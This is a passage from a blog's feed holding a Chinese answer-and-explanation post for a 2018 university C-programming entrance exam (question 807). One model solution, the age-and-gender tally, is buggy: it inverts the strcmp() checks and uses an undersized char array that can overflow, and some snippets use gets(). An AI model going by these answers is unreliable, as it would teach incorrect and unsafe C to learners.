src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;单项选择题&quot;&gt;&lt;a href=&quot;#单项选择题&quot; class=&quot;headerlink&quot; title=&quot;单项选择题&quot;&gt;&lt;/a&gt;单项选择题&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;C语言编译程序的首要工作是&lt;br&gt;A. 检查C程序的完整性&lt;br&gt;B. 检查C程序的逻辑错误&lt;br
      
    
    </summary>
    
      <category term="考研" scheme="https://blog.zimo.wiki/categories/%E8%80%83%E7%A0%94/"/>
    
    
      <category term="考研" scheme="https://blog.zimo.wiki/tags/%E8%80%83%E7%A0%94/"/>
    
      <category term="807" scheme="https://blog.zimo.wiki/tags/807/"/>
    
      <category term="程序综合设计" scheme="https://blog.zimo.wiki/tags/%E7%A8%8B%E5%BA%8F%E7%BB%BC%E5%90%88%E8%AE%BE%E8%AE%A1/"/>
    
      <category term="c语言" scheme="https://blog.zimo.wiki/tags/c%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>成信大807程序综合设计2018年真题答案以及解析</title>
    <link href="https://blog.zimo.wiki/posts/29047cc4/"/>
    <id>https://blog.zimo.wiki/posts/29047cc4/</id>
    <published>2019-11-19T08:23:31.000Z</published>
    <updated>2022-05-04T02:56:01.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="单项选择题"><a href="#单项选择题" class="headerlink" title="单项选择题"></a>单项选择题</h2><ol><li>设整型变量x，y的值分别为0，1, 那么x || y的结果是<br>A. 0<br>B. 1<br>C. 2<br>D. 都不对<br>答案：<code>B</code><br>解析：x || y，意思是x或者y，含义是x，y只要有一个非0，值就为1（真）</li><li>变量的指针，其含义是指该变量的<br>A. 值<br>B. 名<br>C. 地址<br>D. 一个标志<br>答案：<code>C</code><br>解析：变量的指针，指向的是该变量所在的内存地址；变量的值指得是该变量所对应内存单元中存的值；变量名代表变量的标志（标识符）</li><li>C语言源程序文件后缀为<br>A. .c<br>B. .obj<br>C. .exe<br>D. .cpp<br>答案：<code>A</code><br>解析：.obj是C程序程序编译时生成的中间代码文件目标文件；.exe是Windows上的可执行文件；.cpp是C++源程序文件</li><li>下列语句不具有赋值功能的是<br>A. x*=y;<br>B. z=l;<br>C. x++;<br>D. x+y;<br>答案：<code>D</code><br>解析：A可写为x = x * y；C可写为x = x + 1；</li><li>若在某程序中定义了多个函数，则以下说法中正确的是<br>A. C语言程序总是从main()函数开始执行。<br>B. 在C语言程序中，要调用的函数必须在main()函数中定义。<br>C. C语言程序总是从第一个定义的函数开始执行。<br>D. C语言程序中的main()函数必须放在程序的最后部分。<br>答案：<code>A</code><br>解析：main()函数是C程序的入口，所以总是会从main()函数开始执行；B选项，要调用的函数只需要把声明放在main函数的前面即可；A选项对，C选项就肯定错了；D选项，main()可以放在程序的任何地方（除了其他定义、声明等的内部）</li><li>for(表达式1;表达式2;表达式3)中，能省略的表达式有<br>A. 表达式1<br>B. 表达式2<br>C. 表达式3<br>D. 3个都可以<br>答案：<code>D</code><br>解析：for循环中的三个表达式都可省略，此时是个死循环</li><li>判断字符串s1的长度是否等于字符串s2的长度，应使用<br>A. if (sI == s2)<br>B. if(strlen(s1) == strlen(s2))<br>C. if(strcmp(s1,s2))<br>D. if(strcat(s1) &gt; strcat(s2))<br>答案：<code>B</code><br>解析：A选项在判断s1，s2地址是否相同；C选项在判断s1字符串是否大于s2字符串，这里比较的是字符串内容不是指针地址；D选项直接是非法的，strcat函数不是这么用的</li><li>以下语句的输出结果是:<br><code>int a=100, b=100;</code><br><code>printf(&quot;%d %d\n&quot;, --a, b++);</code><br>A. 100 100<br>B. 99 99<br>C. 99 100<br>D. 100 101<br>答案：<code>C</code><br>解析：printf从右到左入栈，然后从左到右打印（看不懂就忽略前面，直接看后面），--、++运算符放前面，先运算后使用，放后面，先使用后运算，所以结果是99 100，打印完成之后，b的值变为101，a的值是99</li><li>在以下结构体数组定义中，正确的是<br>A. struct student { int no; char name[20]; float score };<br>B. struct stu[20] { int no; char name[20]; float score; }<br>C. struct student { int no; char name[20]; float score; } stu[20];<br>D. student { int no; char name[20];float score; } stu[20];<br>答案：<code>C</code><br>解析：A选项只是定义了一个结构类型，没有定义数组；B选项不合法；D选项也不合法</li><li>输入两个字符数组a,b的正确语句是<br>A. puts(a, b);<br>B. scanf(“%s%s”,a, b);<br>C. scanf(“%s%s” ,&amp;a, &amp;b);<br>D. gets(“a”); gets(“b”);<br>答案：<code>B</code><br>解析：A选项puts函数是输出；C选项错在&amp;，字符数组本身就是地址（指针常量），所以用不着，多此一举了；D选项非法，尝试输入到常量区</li></ol><h2 id="判断题"><a href="#判断题" class="headerlink" title="判断题"></a>判断题</h2><ol start="11"><li><p>在C程序中，语句之间必须要用分号;分隔<br>答案：<code>×</code><br>解析：类似如下情况，两条if语句之间并没有使用分号，而是通过语句块的形式分隔</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (a == b) &#123;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (a &lt; b) &#123;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>C语言本身不提供输入输出语句，输入和输出操作是由函数来实现的<br>答案：<code>√</code><br>解析：这是谭浩强的参考书上的原话</p></li><li><p>变量根据其作用域的范围可以分作全局变量和局部变量<br>答案：<code>√</code><br>解析：全局变量的作用域是从定义的地方开始，到本文件结束；局部变量的作用域是从定义的地方开始，到语句块结束</p></li><li><p>C语言中可以使用如下语句定义数组: char a(10);<br>答案：<code>×</code><br>解析：正确的定义方式应该使用方括号，char a[10];</p></li><li><p>在C语言程序设计中，符号”/*“和”*/“ 之间的内容是C语言的注释<br>答案：<code>√</code><br>解析：C语言中有两种注释方式，第一种是行注释”//“，从这两个斜杠开始，到本行结束；第二种是块注释，就是本题的这种</p></li><li><p>将数组a的首地址赋给指针变量p的语句是p=*a;<br>答案：<code>×</code><br>解析：正确的语句是：p = a;但是需要注意的是，如果就按题目所说的方式写，编译器并不会报语法错误，而是在运行的过程中才会出现未知的错误，这种错误一般来说会导致程序崩溃</p></li><li><p>return 语句必须在每个函数中都出现<br>答案：<code>×</code><br>解析；返回值类型为void（空类型）的函数中可以不出现，也可以出现，这种出现的情况，return语句不需要返回任何值，语义仅代表函数结束</p></li><li><p>C语言在执行循环嵌套语句时的顺序为，先执行内层循环再执行外层循环<br>答案：<code>×</code><br>解析：先执行的肯定是外层循环，但是先执行结束的确是内层循环</p></li><li><p>一个指针变量可以指向不同类型的变量<br>答案：<code>√</code><br>解析：指针变量确实可以指向不同类型的变量，但是这种情况下，有可能导致异常情况，建议不要使用；有一种可以使用的情况就是void *类型的指针变量，注意这里的void *代表的不是空指针类型，而是任意指针类型，也就是说，可以让这种类型的指针指向任何其他类型的变量，系统中的malloc函数的返回值类型就是这种通用的指针类型，这使得C程序变得更为的灵活</p></li><li><p>与if(E)语句中的(E) 等价的表达式是(E==0)<br>答案：<code>×</code><br>解析：if(E)判断的是表达式E是否为0，如果不为0就执行，所以表达式为真的条件是E != 0</p></li></ol><h2 id="程序分析题"><a href="#程序分析题" class="headerlink" title="程序分析题"></a>程序分析题</h2><ol start="21"><li><p>程序运行时，若输入以下字符串:<br>This is a test program! 1230K<br>描述程序的主要功能，并写出程序的运行结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">int</span> count[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;,i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入字符串:\n"</span>);</span><br><span class="line">    gets(str);</span><br><span class="line">    <span class="keyword">while</span> (str[i] != <span class="string">'\0'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] &gt;= <span class="string">'a'</span> &amp;&amp; str[i] &lt;= <span class="string">'z'</span>)</span><br><span class="line">            count[str[i] - <span class="string">'a'</span>]++;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i] &gt;= <span class="string">'A'</span> &amp;&amp; str[i] &lt;= <span class="string">'Z'</span>)</span><br><span class="line">            count[str[i] - <span class="string">'A'</span>]++;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"统计结果为：\n"</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">26</span>;i++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (count[i] != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%c - %d\n"</span>,i + <span class="string">'A'</span>,count[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：</p><ul><li><p>功能：输入一行字符串，不区分大小写字母，统计所有字母出现的次数，输出</p></li><li><p>输出结果：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">统计结果为：</span><br><span class="line">A - <span class="number">2</span></span><br><span class="line">E - <span class="number">1</span></span><br><span class="line">G - <span class="number">1</span></span><br><span class="line">H - <span class="number">1</span></span><br><span class="line">I - <span class="number">2</span></span><br><span class="line">K - <span class="number">1</span></span><br><span class="line">M - <span class="number">1</span></span><br><span class="line">O - <span class="number">1</span></span><br><span class="line">P - <span class="number">1</span></span><br><span class="line">R - <span class="number">2</span></span><br><span class="line">S - <span class="number">3</span></span><br><span class="line">T - <span class="number">3</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>描述程序的主要功能，并写出程序的运行结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> max,min,i,j;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span>&#123;</span></span><br><span class="line">        <span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">int</span> score;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>[5] = &#123;</span><span class="string">"Liming"</span>,<span class="number">75</span>,<span class="string">"Zhangling"</span>,<span class="number">89</span>,<span class="string">"Wanghai"</span>,<span class="number">93</span>,<span class="string">"Liuhong"</span>,<span class="number">62</span>,<span class="string">"Zhaoqiang"</span>,<span class="number">85</span>&#125;;</span><br><span class="line">    max = min = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (stu[i].score &gt; stu[max].score)</span><br><span class="line">            max = i;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (stu[i].score &lt; stu[min].score)</span><br><span class="line">            min = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Max is:%s,%d\n"</span>,stu[max].name,stu[max].score);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Min is:%s,%d\n"</span>,stu[min].name,stu[min].score);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：</p><ul><li>功能：找出5个数组元素中成绩值最大的和成绩值最小的学生，并将她们的全部信息输出</li><li>输出结果：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Max is:Wanghai,<span class="number">93</span></span><br><span class="line">Min is:Liuhong,<span class="number">62</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>程序运行时，若输入以下数据:<br>12345<br>描述程序的主要功能，并写出程序的运行结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> number;</span><br><span class="line">    <span class="keyword">int</span> d;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"请输入一个正整数:"</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;number);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"result:"</span>);</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        d = number % <span class="number">10</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,d);</span><br><span class="line">        number = number / <span class="number">10</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;<span class="keyword">while</span>(number != <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>答案：</p><ul><li>功能：输入一个正整数，将它倒序输出</li><li>输出结果：<code>54321</code></li></ul></li></ol><h2 id="程序设计题"><a href="#程序设计题" class="headerlink" title="程序设计题"></a>程序设计题</h2><ol start="24"><li><p>编写程序，实现下列格式的乘法口诀表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>*<span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="number">2</span>*<span class="number">1</span>=<span class="number">2</span>   <span class="number">2</span>*<span class="number">2</span>=<span class="number">4</span></span><br><span class="line"><span class="number">3</span>*<span class="number">1</span>=<span class="number">3</span>   <span class="number">3</span>*<span class="number">2</span>=<span class="number">6</span>   <span class="number">3</span>*<span class="number">3</span>=<span class="number">9</span></span><br><span class="line"><span class="number">4</span>*<span class="number">1</span>=<span class="number">4</span>   <span class="number">4</span>*<span class="number">2</span>=<span class="number">8</span>   <span class="number">4</span>*<span class="number">3</span>=<span class="number">12</span>  <span class="number">4</span>*<span class="number">4</span>=<span class="number">16</span></span><br><span class="line"><span class="number">5</span>*<span class="number">1</span>=<span class="number">5</span>   <span class="number">5</span>*<span class="number">2</span>=<span class="number">10</span>  <span class="number">5</span>*<span class="number">3</span>=<span class="number">15</span>  <span class="number">5</span>*<span class="number">4</span>=<span class="number">20</span>  <span class="number">5</span>*<span class="number">5</span>=<span class="number">25</span></span><br><span class="line"><span class="number">6</span>*<span class="number">1</span>=<span class="number">6</span>   <span class="number">6</span>*<span class="number">2</span>=<span class="number">12</span>  <span class="number">6</span>*<span class="number">3</span>=<span class="number">18</span>  <span class="number">6</span>*<span class="number">4</span>=<span class="number">24</span>  <span class="number">6</span>*<span class="number">5</span>=<span class="number">30</span>  <span class="number">6</span>*<span class="number">6</span>=<span class="number">36</span></span><br><span class="line"><span class="number">7</span>*<span class="number">1</span>=<span class="number">7</span>   <span class="number">7</span>*<span class="number">2</span>=<span class="number">14</span>  <span class="number">7</span>*<span class="number">3</span>=<span class="number">21</span>  <span class="number">7</span>*<span class="number">4</span>=<span class="number">28</span>  <span class="number">7</span>*<span class="number">5</span>=<span class="number">35</span>  <span class="number">7</span>*<span class="number">6</span>=<span class="number">42</span>  <span class="number">7</span>*<span class="number">7</span>=<span class="number">49</span></span><br><span class="line"><span class="number">8</span>*<span class="number">1</span>=<span class="number">8</span>   <span class="number">8</span>*<span class="number">2</span>=<span class="number">16</span>  <span class="number">8</span>*<span class="number">3</span>=<span class="number">24</span>  <span class="number">8</span>*<span class="number">4</span>=<span class="number">32</span>  <span class="number">8</span>*<span class="number">5</span>=<span class="number">40</span>  <span class="number">8</span>*<span class="number">6</span>=<span class="number">48</span>  <span class="number">8</span>*<span class="number">7</span>=<span class="number">56</span>  <span class="number">8</span>*<span class="number">8</span>=<span class="number">64</span></span><br><span class="line"><span class="number">9</span>*<span class="number">1</span>=<span class="number">9</span>   <span class="number">9</span>*<span class="number">2</span>=<span class="number">18</span>  <span class="number">9</span>*<span class="number">3</span>=<span class="number">27</span>  <span class="number">9</span>*<span class="number">4</span>=<span class="number">36</span>  <span class="number">9</span>*<span class="number">5</span>=<span class="number">45</span>  <span class="number">9</span>*<span class="number">6</span>=<span class="number">54</span>  <span class="number">9</span>*<span class="number">7</span>=<span class="number">63</span>  <span class="number">9</span>*<span class="number">8</span>=<span class="number">72</span>  <span class="number">9</span>*<span class="number">9</span>=<span class="number">81</span></span><br></pre></td></tr></table></figure><p>答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>;i &lt; <span class="number">10</span>;i++) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>;j &lt;= i;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d*%d=%d\t"</span>,i,j,i * j);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>从键盘输入100个人的姓名、性别和年龄，分别统计0-29岁、30-59岁、60以上的男、女人数<br>答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Nan <span class="meta-string">"男"</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Nv <span class="meta-string">"女"</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">people</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">char</span> sex[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">&#125; ps[N];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> age0[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> age30[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> age60[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入第%d个人的信息：\n"</span>,i + <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入Ta的姓名（不超过10个汉字）："</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,ps[i].name);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入Ta的性别（男或者女）："</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,ps[i].sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"请输入Ta的年龄（整数）："</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;ps[i].age);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; N;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ps[i].age &gt;= <span class="number">0</span> &amp;&amp; ps[i].age &lt; <span class="number">30</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(Nan,ps[i].sex))</span><br><span class="line">            &#123;</span><br><span class="line">                age0[<span class="number">0</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(Nv,ps[i].sex))</span><br><span class="line">            &#123;</span><br><span class="line">                age0[<span class="number">1</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (ps[i].age &gt;= <span class="number">30</span> &amp;&amp; ps[i].age &lt; <span class="number">60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(Nan,ps[i].sex))</span><br><span class="line">            &#123;</span><br><span class="line">                age30[<span class="number">0</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(Nv,ps[i].sex))</span><br><span class="line">            &#123;</span><br><span class="line">                age30[<span class="number">1</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (ps[i].age &gt;= <span class="number">60</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(Nan,ps[i].sex))</span><br><span class="line">            &#123;</span><br><span class="line">                age60[<span class="number">0</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strcmp</span>(Nv,ps[i].sex))</span><br><span class="line">            &#123;</span><br><span class="line">                age60[<span class="number">1</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"统计结果：\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0 ~ 29岁性别为男的人数为%d，0 ~ 29岁性别为女的人数为%d\n"</span>,age0[<span class="number">0</span>],age0[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"30 ~ 59岁性别为男的人数为%d，30 ~ 59岁性别为女的人数为%d\n"</span>,age30[<span class="number">0</span>],age30[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"60岁以上性别为男的人数为%d，60岁以上性别为女的人数为%d\n"</span>,age60[<span class="number">0</span>],age60[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>从键盘上输入字符串1，将字符串I中除去数字字符’0’ ~ ‘9’之后的其它字符保留在字符串2中，开输出字符串2<br>答案：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span 